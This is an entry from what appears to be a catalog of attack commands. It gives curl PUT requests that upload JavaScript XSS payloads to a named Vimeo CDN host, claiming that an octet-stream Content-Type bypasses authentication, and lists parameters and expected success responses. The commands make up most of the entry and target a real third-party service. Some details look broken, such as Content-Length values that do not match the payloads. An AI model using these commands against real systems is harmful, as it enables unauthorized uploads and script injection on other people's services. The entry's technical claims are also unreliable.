---
id: cmd-vimeo-cdn-put-001
data: >-
  curl -X PUT https://vpe.cdn.vimeo.tv/something.js -H "Content-Type:
  application/octet-stream" -H "Content-Length: 10" --data
  "alert(document.domain)" --connect-timeout 10
tags:
  - http
  - upload
  - xss
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:06.800Z'
verified: false
validated: true
submitted: true
---
# curl-put-upload-xss-to-vimeo-cdn

## Command

```bash
curl -X PUT https://vpe.cdn.vimeo.tv/something.js \
  -H "Content-Type: application/octet-stream" \
  -H "Content-Length: 10" \
  --data "alert(document.domain)" \
  --connect-timeout 10
```

## Description

This command uses curl to send an HTTP PUT request to upload a JavaScript file with an XSS payload to the Vimeo CDN, exploiting improper access control by setting Content-Type to application/octet-stream.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X PUT` | Specifies the HTTP method as PUT for upload | Yes |
| `https://vpe.cdn.vimeo.tv/something.js` | Target URL and arbitrary file path | Yes |
| `-H "Content-Type: application/octet-stream"` | Bypasses auth by using octet-stream type | Yes |
| `-H "Content-Length: 10"` | Sets body length to match payload | Yes |
| `--data "alert(document.domain)"` | The XSS payload body | Yes |
| `--connect-timeout 10` | Limits connection time to 10 seconds | No |

## Examples

### Basic Usage

```bash
curl -X PUT https://vpe.cdn.vimeo.tv/something.js -H "Content-Type: application/octet-stream" -H "Content-Length: 10" --data "alert(document.domain)"
```

### Advanced Usage

```bash
curl -X PUT https://vpe.cdn.vimeo.tv/malicious.js -H "Content-Type: application/octet-stream" -H "Content-Length: 20" --data "console.log('XSS')" -v
```

## Expected Output

HTTP/1.1 200 OK or 201 Created, with no body or a success message. Failure shows auth errors only if Content-Type is changed (e.g., to text/javascript).

## Related

- [[Related Procedure|procedures/Upload-Malicious-JS-to-Vimeo-CDN]]
